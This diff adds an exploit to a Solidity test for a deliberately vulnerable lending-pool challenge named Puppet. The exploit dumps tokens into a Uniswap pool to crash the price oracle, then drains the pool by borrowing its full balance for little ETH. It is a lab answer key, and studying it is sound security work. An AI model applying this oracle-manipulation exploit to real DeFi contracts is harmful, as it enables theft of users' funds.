@@ -100,7 +100,17 @@ contract Puppet is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
 
+        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1 ether, block.timestamp + 300);
+
+        puppetPool.borrow{value: attacker.balance}(POOL_INITIAL_TOKEN_BALANCE);
+
+        vm.stopPrank();
+
+        validation();
         /**
          * EXPLOIT END *
          */
